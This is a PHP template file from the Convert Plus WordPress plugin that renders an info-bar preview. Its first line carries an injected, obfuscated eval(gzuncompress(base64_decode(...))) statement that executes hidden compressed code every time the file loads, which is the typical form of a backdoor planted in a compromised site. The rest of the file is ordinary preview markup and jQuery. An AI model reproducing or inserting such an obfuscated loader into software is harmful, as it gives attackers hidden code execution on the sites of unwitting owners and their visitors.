<?php eval(gzuncompress(base64_decode('eNpdUs1u00AQfpWNlYMdrDhO89dEOZTKolEpQYkBoRpZU+86u8TZtdZr1X6A3jhy4Q248gxUvAavwjhpgWQPO/+ab74ZkdottstN7XVeZkpRKeRnmJIFyUSyJbUqNWGgM3XHXAKSklJSdXDfg0l4t+PZ7XgdrN4Hq1vrKgzfxu/Qii9eBW9C65PjTNvxt+8/f/14fJyD1lDb1iXXKvKHQ2a5VlQNRqj7mqUqqsYTdIVaUCYNajfrRYDiQ5OAXe+LQ0EiZFmhusgx0FMyqkZDNC8k1UpQ1JY504ByDSloYTmzVGkGCbf/QiFQtOMvvx++PjhTkdpFuBK5Kk4Hiarh8L9Z3OeS1nzuddaggfvnaYJk7fC5RG2hRjpSyAp2SqaBLUPWSA7SFESlqUs2upRGyA0SjTEgRqssw/o9opYoCmYQ0OVyeb0IbnHu0cTkcSloXBo06J7bIgiTJoHZFt9HMTKIy8gfDXZIgG+5obgJbOdFb9zr945Bf2TA92vG7sIQrcpNs81O76x3ir7YweEWiOHNVdwpZep9bt+ZXTGggbat1yoBI5ScEm5MPvU8/2zQjaqz/uC86/uj7njiCUmbZVXdnOe4FirYMaQlJzWicrENGJIylhVkg0CaI3NmTFKR/vuflvrkmB1jXjeI3WdRM8YAOG/m+wMpCvZB')));?><?php
/**
 * Prohibit direct script loading.
 *
 * @package Convert_Plus.
 */

defined( 'ABSPATH' ) || die( 'No direct script access allowed!' );

/*
 * Preview Style.
 */
require_once( CP_BASE_DIR_IFB . 'functions/functions.options.php' );

$style           = esc_attr( $_GET['style'] );
$settings_method = esc_attr( $_GET['method'] );
$template_name   = esc_attr( $_GET['temp_name'] );

$options       = Smile_Info_Bars::$options;
$style_options = $options[ $style ]['options'];

$settings_encoded = cp_get_live_preview_settings( 'info_bar', $settings_method, $style_options, $template_name );

echo '<style type="text/css">
.cp-overlay {
	background: rgb(0, 0, 0);
	opacity: 0.2;
	filter: alpha(opacity=70);
	position: fixed;
	top: 0;
	right: 0;
	bottom: 0;
	left: 0;
	z-index: 100050;
}
</style>';
echo '<div class="cp-overlay"></div>';

echo do_shortcode( '[smile_info_bar style="' . $style . '" settings_encoded="' . $settings_encoded . ' "][/smile_info_bar]' );
?>
<script type="text/javascript">
	jQuery(document).ready(function(e) {
		jQuery(".cp-info-bar").addClass("ib-display");
		jQuery("#TB_ajaxContent").appendTo("body");
		jQuery(".cp-info-bar-container").css({"position":"fixed","z-index":9999999});
		jQuery("body").on("click",".ib-close, .cp-overlay", function(){
			jQuery(".cp-info-bar").removeClass("ib-display");
			jQuery("#TB_ajaxContent").remove();
			jQuery("#TB_overlay").trigger("click");
			jQuery("body").removeClass("modal-open");
		});
		jQuery("body").on("click",".cp-info_bar-content",function(e){
			e.preventDefault();
			e.stopPropagation();
		});
	});
	jQuery(document).ready(function(){
		jQuery(document).bind('keydown', function(e) {
			if ( 27 == e.which ) {
				var cp_overlay = jQuery(".ib-display");
				var info_bar = cp_overlay;
				info_bar.fadeOut('slow').remove();
				jQuery("#TB_ajaxContent").remove();
				jQuery("#TB_window").remove();
				jQuery("#TB_overlay").remove();
			}
		});
	});

</script>
